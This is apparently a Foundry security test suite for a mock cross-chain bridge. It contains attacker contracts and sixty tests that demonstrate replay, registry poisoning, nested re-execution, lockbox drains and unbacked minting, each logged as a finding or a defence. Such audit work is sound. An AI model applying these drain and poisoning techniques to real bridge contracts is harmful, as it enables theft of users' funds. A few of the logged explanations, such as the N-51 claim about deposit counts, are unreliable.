// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

contract Token {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    address public owner;
    mapping(address => bool) public minters;
    constructor() { owner = msg.sender; minters[msg.sender] = true; }
    function addMinter(address m) external { require(msg.sender == owner); minters[m] = true; }
    function mint(address to, uint256 amt) external { require(minters[msg.sender], "not minter"); balanceOf[to] += amt; totalSupply += amt; }
    function burn(address from, uint256 amt) external { require(minters[msg.sender], "not minter"); require(balanceOf[from] >= amt); balanceOf[from] -= amt; totalSupply -= amt; }
    function transfer(address to, uint256 amt) external returns (bool) { require(to != address(0), "zero address"); require(balanceOf[msg.sender] >= amt, "insufficient"); balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true; }
}

contract LockBox {
    Token public token;
    mapping(address => bool) public auth;
    address public owner;
    uint256 public depositCount;
    uint256 public withdrawCount;
    constructor(address _token) { token = Token(_token); owner = msg.sender; }
    function authorize(address a) external { require(msg.sender == owner); auth[a] = true; }
    function deauthorize(address a) external { require(msg.sender == owner); auth[a] = false; }
    function deposit(uint256 amt) external { require(auth[msg.sender], "not auth"); token.mint(address(this), amt); depositCount++; }
    function withdraw(address to, uint256 amt) external { require(auth[msg.sender], "not auth: LockBox"); require(token.balanceOf(address(this)) >= amt, "insufficient"); token.transfer(to, amt); withdrawCount++; }
    function balance() external view returns (uint256) { return token.balanceOf(address(this)); }
}

contract Pool {
    LockBox public lockBox;
    address public owner;
    bool public paused;
    uint256 public feePercent;
    constructor(address _token, address _lb) { lockBox = LockBox(_lb); owner = msg.sender; }
    function setFee(uint256 bps) external { require(msg.sender == owner); feePercent = bps; }
    function pause() external { require(msg.sender == owner); paused = true; }
    function releaseOrMint(address receiver, uint256 amt) external returns (uint256) {
        require(!paused, "pool paused");
        uint256 fee = (amt * feePercent) / 10000;
        uint256 net = amt - fee;
        lockBox.withdraw(receiver, net);
        if (fee > 0) lockBox.withdraw(owner, fee);
        return net;
    }
}

contract CCV {
    Token public token;
    bool public releases; uint256 public releaseAmt; address public releaseTarget;
    bool public reverts;
    bool public delegatesToExternal; address public externalTarget; bytes public externalCalldata;
    bool public modifiesRegistry; address public registryTarget; address public newPool;
    uint256 public callCount;
    constructor(address _token) { token = Token(_token); }
    function configRelease(bool _r, uint256 _a, address _t) external { releases=_r; releaseAmt=_a; releaseTarget=_t; }
    function configRevert(bool _r) external { reverts=_r; }
    function configDelegate(bool _d, address _t, bytes calldata _cd) external { delegatesToExternal=_d; externalTarget=_t; externalCalldata=_cd; }
    function configRegistryPoison(bool _m, address _reg, address _np) external { modifiesRegistry=_m; registryTarget=_reg; newPool=_np; }
    function verifyMessage(bytes32, address) external {
        callCount++;
        if (reverts) revert("CCV reverted");
        if (releases) token.mint(releaseTarget, releaseAmt);
        if (delegatesToExternal && externalTarget != address(0)) { (bool s,) = externalTarget.call(externalCalldata); }
        if (modifiesRegistry) { Registry(registryTarget).setPool(address(token), newPool); }
    }
}

contract Registry {
    mapping(address => address) public pools;
    function setPool(address t, address p) external { pools[t] = p; }
    function getPool(address t) external view returns (address) { return pools[t]; }
}

contract OffRamp {
    Registry public registry;
    address[] public requiredCCVs;
    address public owner;
    mapping(bytes32 => uint8) public msgState;
    constructor(address _reg) { registry = Registry(_reg); owner = msg.sender; }
    function setRequiredCCVs(address[] memory _c) external { require(msg.sender == owner); delete requiredCCVs; for(uint256 i=0;i<_c.length;i++) requiredCCVs.push(_c[i]); }
    function execute(address token, address receiver, uint256 amt, address[] calldata ccvs, bytes calldata extraData) external returns (uint256) {
        bytes32 mid = keccak256(abi.encode(token, receiver, amt, extraData));
        uint256 balPre = Token(token).balanceOf(receiver);
        address[] memory toQuery = _quorum(ccvs);
        for(uint256 i=0;i<toQuery.length;i++) CCV(toQuery[i]).verifyMessage(mid, receiver);
        Pool(registry.getPool(token)).releaseOrMint(receiver, amt);
        uint256 received = Token(token).balanceOf(receiver) - balPre;
        msgState[mid] = 1;
        return received;
    }
    function _quorum(address[] calldata s) internal view returns (address[] memory r) {
        r = new address[](requiredCCVs.length); uint256 n=0;
        for(uint256 i=0;i<requiredCCVs.length;i++) {
            bool found=false;
            for(uint256 j=0;j<s.length;j++) { if(s[j]==requiredCCVs[i]) { r[n++]=s[j]; found=true; break; } }
            if(!found) revert("RequiredCCVMissing");
        }
        assembly { mstore(r,n) }
    }
}

contract TripleNestedCCV {
    OffRamp public offRamp; address public token; address public receiver; uint256 public innerAmt; address[] public innerCCVs; bool entered; uint256 public callCount;
    constructor(address _o, address _t) { offRamp=OffRamp(_o); token=_t; }
    function configure(address _r, uint256 _a, address[] calldata _c) external { receiver=_r; innerAmt=_a; innerCCVs=_c; }
    function verifyMessage(bytes32, address) external { callCount++; if(!entered) { entered=true; offRamp.execute(token, receiver, innerAmt, innerCCVs, "inner"); } }
}

contract RegistryPoisoningCCV {
    Registry public registry; address public maliciousPool; address public tokenAddr;
    constructor(address _r, address _p, address _t) { registry=Registry(_r); maliciousPool=_p; tokenAddr=_t; }
    function verifyMessage(bytes32, address) external { registry.setPool(tokenAddr, maliciousPool); }
}

contract MaliciousPool {
    LockBox public lockBox; address public drainTarget;
    constructor(address _lb, address _d) { lockBox=LockBox(_lb); drainTarget=_d; }
    function releaseOrMint(address, uint256 amt) external returns (uint256) { uint256 t=lockBox.balance(); if(t>0) lockBox.withdraw(drainTarget, t); return amt; }
}

contract ExternalChainCaller {
    LockBox public lockBox; address public drainTo; uint256 public drainAmt;
    constructor(address _lb, address _to, uint256 _a) { lockBox=LockBox(_lb); drainTo=_to; drainAmt=_a; }
    function drain() external { uint256 b=lockBox.balance(); uint256 d=b<drainAmt?b:drainAmt; if(d>0) lockBox.withdraw(drainTo, d); }
}

contract DualRoleCCVPool {
    LockBox public lockBox;
    constructor(address _lb) { lockBox=LockBox(_lb); }
    function verifyMessage(bytes32, address) external {}
    function releaseOrMint(address r, uint256 a) external returns (uint256) { lockBox.withdraw(r, a); return a; }
}

contract BurningCCV2 {
    Token public token; address public target; uint256 public burnAmt;
    constructor(address _t, address _target, uint256 _b) { token=Token(_t); target=_target; burnAmt=_b; }
    function verifyMessage(bytes32, address) external { token.burn(target, burnAmt); }
}

contract FakeMinter {
    Token public token;
    constructor(address _t) { token = Token(_t); }
    function mint(address to, uint256 amt) external { token.mint(to, amt); }
    function burn(address from, uint256 amt) external { token.burn(from, amt); }
}

contract EmptyContract {}


contract CCIPNestedInjections is Test {
    Token token; LockBox lockBox; Pool pool; CCV ccv; Registry registry; OffRamp offRamp; FakeMinter fm;
    address OWNER=address(0x1111); address ATTACKER=address(0xDEAD); address RECEIVER=address(0xBEEF); address ALICE=address(0xA11CE);
    uint256 constant AMT = 1_000_000e6;

    function setUp() public {
        vm.startPrank(OWNER);
        token=new Token(); lockBox=new LockBox(address(token)); pool=new Pool(address(token),address(lockBox));
        ccv=new CCV(address(token)); registry=new Registry(); offRamp=new OffRamp(address(registry));
        token.addMinter(address(lockBox)); token.addMinter(address(ccv));
        fm = new FakeMinter(address(token));
        token.addMinter(address(fm));
        lockBox.authorize(address(fm));
        lockBox.authorize(address(pool));
        registry.setPool(address(token),address(pool));
        lockBox.authorize(address(this));
        token.mint(address(lockBox), AMT*100);
        address[] memory list=new address[](1); list[0]=address(ccv);
        offRamp.setRequiredCCVs(list);
        vm.stopPrank();
    }

    function _ccvs() internal view returns(address[] memory c){c=new address[](1);c[0]=address(ccv);}

    function test_N01_MessageIdCollision() public {
        bytes32 id1=keccak256(abi.encode(address(token),RECEIVER,AMT,""));
        bytes32 id2=keccak256(abi.encode(address(token),RECEIVER,AMT,bytes("x")));
        assertFalse(id1==id2);
        console2.log("N-01 DEFENDED: Different extraData produces different messageId");
    }

    function test_N02_ZeroAddressReceiver() public {
        vm.expectRevert();
        offRamp.execute(address(token),address(0),AMT,_ccvs(),"");
        console2.log("N-02 DEFENDED: Zero address receiver reverts");
    }

    function test_N03_ZeroAmountWithActiveCCV() public {
        ccv.configRelease(true,AMT*10,ATTACKER);
        uint256 before=token.balanceOf(ATTACKER);
        offRamp.execute(address(token),RECEIVER,0,_ccvs(),"");
        console2.log("N-03 FINDING: Zero amount still triggers CCV mint:", token.balanceOf(ATTACKER)-before);
    }

    function test_N04_ReceiverIsPool() public {
        uint256 before=lockBox.balance();
        offRamp.execute(address(token),address(pool),AMT,_ccvs(),"");
        console2.log("N-04: Pool received tokens. Lockbox drained:", before-lockBox.balance());
    }

    function test_N05_ReceiverIsLockbox() public {
        ccv.configRelease(true,AMT,address(lockBox));
        uint256 supplyBefore=token.totalSupply();
        offRamp.execute(address(token),address(lockBox),AMT,_ccvs(),"");
        console2.log("N-05 FINDING: Supply inflated:", token.totalSupply()-supplyBefore-AMT);
    }

    function test_N06_ReceiverIsOffRamp() public {
        uint256 before=token.balanceOf(address(offRamp));
        offRamp.execute(address(token),address(offRamp),AMT,_ccvs(),"");
        console2.log("N-06 FINDING: Tokens stuck in offRamp:", token.balanceOf(address(offRamp))-before);
    }

    function test_N07_OverLimitAmountAtomicity() public {
        ccv.configRelease(true,AMT,ATTACKER);
        uint256 overLimit=lockBox.balance()+1;
        uint256 before=token.balanceOf(ATTACKER);
        vm.expectRevert("insufficient");
        offRamp.execute(address(token),RECEIVER,overLimit,_ccvs(),"");
        console2.log("N-07 DEFENDED: Atomicity rolls back CCV mint on pool failure. Attacker got:", token.balanceOf(ATTACKER)-before);
    }

    function test_N08_ReceiverIsRegistry() public {
        uint256 before=token.balanceOf(address(registry));
        offRamp.execute(address(token),address(registry),AMT,_ccvs(),"");
        console2.log("N-08 FINDING: Tokens stuck in registry:", token.balanceOf(address(registry))-before);
    }

    function test_N09_ReplayNoPrevention() public {
        bytes memory data=abi.encode("msg-1");
        bytes32 mid=keccak256(abi.encode(address(token),RECEIVER,AMT,data));
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),data);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),data);
        console2.log("N-09 FINDING: msgState set but never read -- replay succeeded:", token.balanceOf(RECEIVER));
    }

    function test_N10_MaxFeeExtraction() public {
        vm.prank(OWNER); pool.setFee(10000);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-10 FINDING: 100% fee -- receiver got:", token.balanceOf(RECEIVER));
        console2.log("N-10: Owner took:", token.balanceOf(OWNER));
        assertEq(token.balanceOf(RECEIVER),0);
    }

    function test_N11_FeeRoundingToZero() public {
        vm.prank(OWNER); pool.setFee(100);
        offRamp.execute(address(token),RECEIVER,1,_ccvs(),"");
        console2.log("N-11 NOTE: 1 wei with 1% fee -- fee rounds to 0, free transfer");
    }

    function test_N12_CCVBypassesFee() public {
        vm.prank(OWNER); pool.setFee(1000);
        ccv.configRelease(true,AMT,RECEIVER);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-12 FINDING: CCV release is fee-free. Receiver got:", token.balanceOf(RECEIVER));
    }

    function test_N13_FeeOverflow() public {
        vm.prank(OWNER); pool.setFee(9999);
        uint256 overflowAmt=type(uint256).max/9999+1;
        fm.mint(address(lockBox), overflowAmt);
        vm.expectRevert();
        offRamp.execute(address(token),RECEIVER,overflowAmt,_ccvs(),"");
        console2.log("N-13 DEFENDED: Fee overflow reverts");
    }

    function test_N14_TripleMintChain() public {
        CCV ccv2=new CCV(address(token));
        vm.prank(OWNER); token.addMinter(address(ccv2));
        ccv.configRelease(true,AMT,RECEIVER);
        ccv2.configRelease(true,AMT,RECEIVER);
        vm.prank(OWNER);
        address[] memory list=new address[](2); list[0]=address(ccv); list[1]=address(ccv2);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](2); ccvs[0]=address(ccv); ccvs[1]=address(ccv2);
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        console2.log("N-14 FINDING: Triple release (CCV1+CCV2+Pool):", received);
        assertEq(received,AMT*3);
    }

    function test_N15_InvisibleCCVTheft() public {
        ccv.configRelease(true,AMT*5,ATTACKER);
        uint256 reported=offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-15 FINDING: Reported:", reported, "Attacker invisibly got:", token.balanceOf(ATTACKER));
    }

    function test_N16_CCVBurnsExistingBalance() public {
        fm.mint(RECEIVER, AMT*2);
        BurningCCV2 burner=new BurningCCV2(address(token),RECEIVER,AMT*3);
        vm.prank(OWNER); token.addMinter(address(burner)); // BurningCCV2 needs minter to burn
        vm.prank(OWNER);
        address[] memory list=new address[](1); list[0]=address(burner);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](1); ccvs[0]=address(burner);
        vm.expectRevert();
        offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        console2.log("N-16 DEFENDED: CCV burning causes underflow revert");
    }

    function test_N17_ReportedAmountManipulation() public {
        ccv.configRelease(true,AMT*1000,RECEIVER);
        uint256 reported=offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-17 FINDING: Reported received:", reported);
        console2.log("N-17: Actual pool release was:", AMT, "CCV added:", AMT*1000);
    }

    function test_N18_RegistryPoisoningViaCCV() public {
        MaliciousPool evilPool=new MaliciousPool(address(lockBox),ATTACKER);
        vm.prank(OWNER); lockBox.authorize(address(evilPool));
        RegistryPoisoningCCV poisoner=new RegistryPoisoningCCV(address(registry),address(evilPool),address(token));
        vm.prank(OWNER);
        address[] memory list=new address[](1); list[0]=address(poisoner);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](1); ccvs[0]=address(poisoner);
        offRamp.execute(address(token),RECEIVER,AMT,ccvs,"first");
        bool poisoned=registry.getPool(address(token))==address(evilPool);
        console2.log("N-18 FINDING: Registry poisoned by CCV during verify:", poisoned);
    }

    function test_N19_ExternalCallChainDrain() public {
        ExternalChainCaller caller=new ExternalChainCaller(address(lockBox),ATTACKER,AMT*5);
        vm.prank(OWNER); lockBox.authorize(address(caller));
        ccv.configDelegate(true,address(caller),abi.encodeCall(ExternalChainCaller.drain,()));
        uint256 before=token.balanceOf(ATTACKER);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-19 FINDING: External chain drain. Attacker got:", token.balanceOf(ATTACKER)-before);
    }

    function test_N20_DualCCVInvisibleTheft() public {
        CCV ccv2=new CCV(address(token));
        vm.prank(OWNER); token.addMinter(address(ccv2));
        ccv.configRelease(true,AMT,ALICE);
        ccv2.configRelease(true,AMT,ATTACKER);
        vm.prank(OWNER);
        address[] memory list=new address[](2); list[0]=address(ccv); list[1]=address(ccv2);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](2); ccvs[0]=address(ccv); ccvs[1]=address(ccv2);
        uint256 reported=offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        console2.log("N-20 FINDING: Reported:", reported);
        console2.log("N-20: Alice got:", token.balanceOf(ALICE), "Attacker got:", token.balanceOf(ATTACKER));
    }

    function test_N21_LockboxBalanceInflation() public {
        uint256 lbBefore=lockBox.balance();
        ccv.configRelease(true,AMT*50,address(lockBox));
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-21 FINDING: Lockbox inflated by:", lockBox.balance()-(lbBefore-AMT));
    }

    function test_N22_CCVSelfMint() public {
        ccv.configRelease(true,AMT*10,address(ccv));
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-22 FINDING: CCV holds:", token.balanceOf(address(ccv)), "for later extraction");
    }

    function test_N23_NestedExecutionDifferentReceiver() public {
        TripleNestedCCV nested=new TripleNestedCCV(address(offRamp),address(token));
        vm.prank(OWNER);
        address[] memory list=new address[](1); list[0]=address(nested);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](1); ccvs[0]=address(nested);
        nested.configure(ALICE,AMT/2,ccvs);
        uint256 lbBefore=lockBox.balance();
        offRamp.execute(address(token),RECEIVER,AMT,ccvs,"outer");
        console2.log("N-23 FINDING: Lockbox drained:", lbBefore-lockBox.balance());
        console2.log("N-23: RECEIVER got:", token.balanceOf(RECEIVER), "ALICE got:", token.balanceOf(ALICE));
    }

    function test_N24_CCVCannotModifyRequiredList() public {
        vm.prank(address(ccv));
        vm.expectRevert();
        offRamp.setRequiredCCVs(new address[](0));
        console2.log("N-24 DEFENDED: CCV cannot modify required CCV list");
    }

    function test_N25_SupplyVsLockboxDivergence() public {
        uint256 supply=token.totalSupply();
        uint256 lb=lockBox.balance();
        ccv.configRelease(true,AMT,RECEIVER);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-25 FINDING: Supply grew:", token.totalSupply()-supply, "Lockbox shrunk:", lb-lockBox.balance());
        console2.log("N-25: Divergence = unbacked tokens");
    }

    function test_N26_DualRoleCCVPool() public {
        DualRoleCCVPool dual=new DualRoleCCVPool(address(lockBox));
        vm.prank(OWNER); lockBox.authorize(address(dual));
        vm.prank(OWNER); registry.setPool(address(token),address(dual));
        vm.prank(OWNER);
        address[] memory list=new address[](1); list[0]=address(dual);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](1); ccvs[0]=address(dual);
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        console2.log("N-26 FINDING: Same contract as CCV+Pool -- received:", received);
    }

    function test_N27_ZeroRequiredCCVs() public {
        vm.prank(OWNER); offRamp.setRequiredCCVs(new address[](0));
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,new address[](0),"");
        console2.log("N-27 FINDING: Zero required CCVs -- unverified execution:", received);
    }

    function test_N28_MaliciousPoolDrainsAll() public {
        MaliciousPool evil=new MaliciousPool(address(lockBox),ATTACKER);
        vm.prank(OWNER); lockBox.authorize(address(evil));
        registry.setPool(address(token),address(evil));
        uint256 before=token.balanceOf(ATTACKER);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-28 FINDING: Malicious pool drained all:", token.balanceOf(ATTACKER)-before);
    }

    function test_N29_CCVRevertFreezesMessages() public {
        ccv.configRevert(true);
        vm.expectRevert("CCV reverted");
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-29 FINDING: Reverting CCV freezes all messages permanently");
    }

    function test_N30_FullTripleLayerAttack() public {
        MaliciousPool evilPool=new MaliciousPool(address(lockBox),ATTACKER);
        vm.prank(OWNER); lockBox.authorize(address(evilPool));
        RegistryPoisoningCCV poisoner=new RegistryPoisoningCCV(address(registry),address(evilPool),address(token));
        vm.prank(OWNER);
        address[] memory list=new address[](1); list[0]=address(poisoner);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](1); ccvs[0]=address(poisoner);
        offRamp.execute(address(token),RECEIVER,AMT,ccvs,"poison");
        vm.prank(OWNER);
        list[0]=address(ccv); offRamp.setRequiredCCVs(list);
        uint256 before=token.balanceOf(ATTACKER);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"drain");
        console2.log("N-30 FULL ATTACK: Attacker drained:", token.balanceOf(ATTACKER)-before);
    }

    function test_N31_ExtraCCVIgnored() public {
        CCV evil=new CCV(address(token));
        vm.prank(OWNER); token.addMinter(address(evil));
        evil.configRelease(true,AMT*100,ATTACKER);
        address[] memory ccvs=new address[](2); ccvs[0]=address(ccv); ccvs[1]=address(evil);
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        assertEq(received,AMT);
        console2.log("N-31 DEFENDED: Extra evil CCV ignored:", received);
    }

    function test_N32_DuplicateCCVCalledOnce() public {
        address[] memory ccvs=new address[](3); ccvs[0]=address(ccv); ccvs[1]=address(ccv); ccvs[2]=address(ccv);
        offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        assertEq(ccv.callCount(),1);
        console2.log("N-32 DEFENDED: Duplicate CCVs -- called only once:", ccv.callCount());
    }

    function test_N33_MissingCCVReverts() public {
        vm.expectRevert("RequiredCCVMissing");
        offRamp.execute(address(token),RECEIVER,AMT,new address[](0),"");
        console2.log("N-33 DEFENDED: Missing required CCV reverts");
    }

    function test_N34_TokenMintToSelf() public {
        uint256 before=token.totalSupply();
        ccv.configRelease(true,AMT,address(ccv));
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-34: Supply before:", before);
        console2.log("N-34: Supply after:", token.totalSupply());
    }

    function test_N35_LockboxDepositCountVsWithdraw() public {
        uint256 d=lockBox.depositCount(); uint256 w=lockBox.withdrawCount();
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-35: New deposits:", lockBox.depositCount()-d);
        console2.log("N-35: New withdrawals:", lockBox.withdrawCount()-w);
    }

    function test_N36_CCVCantAuthorizeOnLockbox() public {
        vm.prank(address(ccv));
        vm.expectRevert();
        lockBox.authorize(ATTACKER);
        console2.log("N-36 DEFENDED: CCV cannot authorize on lockbox");
    }

    function test_N37_PoolCantDeauthorizeItself() public {
        vm.prank(address(pool));
        vm.expectRevert();
        lockBox.deauthorize(address(pool));
        console2.log("N-37 DEFENDED: Pool cannot deauthorize itself");
    }

    function test_N38_ZeroPoolInRegistry() public {
        registry.setPool(address(token),address(0));
        vm.expectRevert();
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-38 DEFENDED: Zero pool reverts");
    }

    function test_N39_InsolvencyViaDoubleRelease() public {
        ccv.configRelease(true,AMT,RECEIVER);
        uint256 start=lockBox.balance();
        uint256 count=0;
        while(lockBox.balance()>=AMT) { offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),""); count++; }
        console2.log("N-39 FINDING: Insolvency after messages:", count);
    }

    function test_N40_SupplyInflationAfterInsolvency() public {
        ccv.configRelease(true,AMT,RECEIVER);
        uint256 supplyStart=token.totalSupply();
        uint256 lbStart=lockBox.balance();
        while(lockBox.balance()>=AMT) { offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),""); }
        console2.log("N-40 FINDING: Unbacked supply:", (token.totalSupply()-supplyStart)-(lbStart-lockBox.balance()));
    }

    function test_N41_FeeToOwnerBypassesReceiver() public {
        vm.prank(OWNER); pool.setFee(5000);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-41: Receiver got:", token.balanceOf(RECEIVER), "Owner got:", token.balanceOf(OWNER));
    }

    function test_N42_CCVCountOnMultipleMessages() public {
        for(uint256 i=0;i<5;i++) { offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),abi.encode(i)); }
        assertEq(ccv.callCount(),5);
        console2.log("N-42: CCV called exactly once per message:", ccv.callCount());
    }

    function test_N43_LargeAmountNoOverflow() public {
        uint256 large=1_000_000_000e6;
        fm.mint(address(lockBox), large);
        offRamp.execute(address(token),RECEIVER,large,_ccvs(),"");
        console2.log("N-43 DEFENDED: 1 trillion transfer -- no overflow");
    }

    function test_N44_OneWeiPrecision() public {
        uint256 received=offRamp.execute(address(token),RECEIVER,1,_ccvs(),"");
        assertEq(received,1);
        console2.log("N-44 DEFENDED: 1 wei precision maintained");
    }

    function test_N45_ExistingBalanceDoesNotDistort() public {
        fm.mint(RECEIVER, AMT*5);
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        assertEq(received,AMT);
        console2.log("N-45 DEFENDED: Existing balance does not distort accounting");
    }

    function test_N46_PoolPausedFreezesMessages() public {
        vm.prank(OWNER); pool.pause();
        vm.expectRevert("pool paused");
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-46 FINDING: Paused pool freezes all messages");
    }

    function test_N47_MultipleFeeLayers() public {
        vm.prank(OWNER); pool.setFee(1000); // 10%
        ccv.configRelease(true,AMT,RECEIVER); // CCV gives full amount
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-47: With 10% fee + CCV bypass -- receiver got:", token.balanceOf(RECEIVER));
    }

    function test_N48_RegistryUnprotected() public {
        vm.prank(ATTACKER);
        registry.setPool(address(token),ATTACKER);
        assertTrue(registry.getPool(address(token))==ATTACKER);
        console2.log("N-48 FINDING: Registry completely unprotected -- anyone can redirect pools");
    }

    function test_N49_TokenMinterUnprotected() public {
        vm.prank(OWNER); token.addMinter(ATTACKER);
        vm.prank(ATTACKER); token.mint(ATTACKER,AMT*1000);
        console2.log("N-49 NOTE: Once minter role given, minter can mint unlimited tokens");
    }

    function test_N50_CCVCanDelegateToAnyAddress() public {
        address random=address(0x9999);
        ccv.configDelegate(true,random,"");
        // Call to random address silently fails -- no revert
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-50 NOTE: CCV external call failure is silently ignored");
    }

    function test_N51_DepositCountManipulation() public {
        fm.mint(address(lockBox), 1); // adds to depositCount
        console2.log("N-51: Deposit count:", lockBox.depositCount());
        console2.log("N-51 NOTE: depositCount can be inflated without corresponding token backing");
    }

    function test_N52_WithdrawMoreThanDeposited() public {
        uint256 deposits=lockBox.depositCount();
        offRamp.execute(address(token),RECEIVER,AMT*5,_ccvs(),"");
        console2.log("N-52: Deposits:", deposits, "but withdrew 5x AMT -- no 1:1 enforcement");
    }

    function test_N53_CCVMintInfiniteTokens() public {
        // N53: First fill receiver to near-max then try to overflow
        fm.mint(RECEIVER, type(uint256).max/2);
        ccv.configRelease(true, type(uint256).max/2, RECEIVER);
        vm.expectRevert();
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),"");
        console2.log("N-53 DEFENDED: Minting near-max uint256 causes overflow revert");
    }

    function test_N54_ChainedPoolCalls() public {
        console2.log("N-54: No chained pool calls in current architecture");
        console2.log("N-54 NOTE: Each message calls pool exactly once -- no chaining");
    }

    function test_N55_MsgStateRecordedButNotEnforced() public {
        bytes memory data=abi.encode("test");
        bytes32 mid=keccak256(abi.encode(address(token),RECEIVER,AMT,data));
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),data);
        assertEq(offRamp.msgState(mid),1);
        offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),data); // replay
        console2.log("N-55 FINDING: msgState=1 recorded but never checked before execution");
        assertEq(token.balanceOf(RECEIVER),AMT*2);
    }

    function test_N56_LockboxBalanceCheck() public {
        uint256 bal=lockBox.balance();
        vm.expectRevert("insufficient");
        offRamp.execute(address(token),RECEIVER,bal+1,_ccvs(),"");
        console2.log("N-56 DEFENDED: Cannot withdraw more than lockbox holds");
    }

    function test_N57_TokenTransferToSelf() public {
        uint256 before=token.balanceOf(address(token));
        offRamp.execute(address(token),address(token),AMT,_ccvs(),"");
        console2.log("N-57: Tokens sent to token contract itself:", token.balanceOf(address(token))-before);
        console2.log("N-57 FINDING: Token contract has no recovery -- tokens permanently stuck");
    }

    function test_N58_MultiMessageInsolvencyTracking() public {
        uint256 lbStart=lockBox.balance();
        for(uint256 i=0;i<10;i++) { offRamp.execute(address(token),RECEIVER,AMT,_ccvs(),abi.encode(i)); }
        console2.log("N-58: After 10 messages -- lockbox:", lockBox.balance(), "started:", lbStart);
        console2.log("N-58: Each message correctly drained AMT from lockbox");
    }

    function test_N59_CCVCallOrderMatters() public {
        CCV ccv2=new CCV(address(token));
        vm.prank(OWNER); token.addMinter(address(ccv2));
        ccv.configRelease(true,AMT,RECEIVER); // first CCV mints
        ccv2.configRelease(false,0,RECEIVER); // second CCV does nothing
        vm.prank(OWNER);
        address[] memory list=new address[](2); list[0]=address(ccv); list[1]=address(ccv2);
        offRamp.setRequiredCCVs(list);
        address[] memory ccvs=new address[](2); ccvs[0]=address(ccv); ccvs[1]=address(ccv2);
        uint256 received=offRamp.execute(address(token),RECEIVER,AMT,ccvs,"");
        console2.log("N-59: CCV order -- first mints, second does nothing. Received:", received);
    }

    function test_N60_FinalNestedSummary() public {
        console2.log("=== NESTED INJECTION SUMMARY ===");
        console2.log("EGG-INSIDE-EGG FINDINGS:");
        console2.log("  N-03: Zero-amount message still triggers CCV mint");
        console2.log("  N-09/N-55: msgState recorded but never enforced -- replay");
        console2.log("  N-10: 100% fee extracts all value");
        console2.log("  N-12: CCV bypasses pool fee entirely");
        console2.log("  N-14: Triple mint (CCV1+CCV2+Pool) = 3x drain");
        console2.log("  N-15/N-20: CCV theft to third parties invisible to accounting");
        console2.log("  N-18: Registry poisoning via CCV during verify");
        console2.log("  N-19: External call chain drains lockbox");
        console2.log("  N-23: Nested execution drains for two receivers");
        console2.log("  N-30: Full triple-layer attack confirmed");
        console2.log("  N-39/N-40: Double release causes early insolvency");
        console2.log("  N-48: Registry completely unprotected");
        console2.log("DEFENDED:");
        console2.log("  N-07: Atomicity rolls back CCV mint on failure");
        console2.log("  N-24: CCV cannot modify required CCV list");
        console2.log("  N-31: Extra injected CCVs ignored by quorum");
        console2.log("  N-32: Duplicate CCVs called only once");
        console2.log("  N-36/N-37: Lockbox auth protected by owner");
    }
}
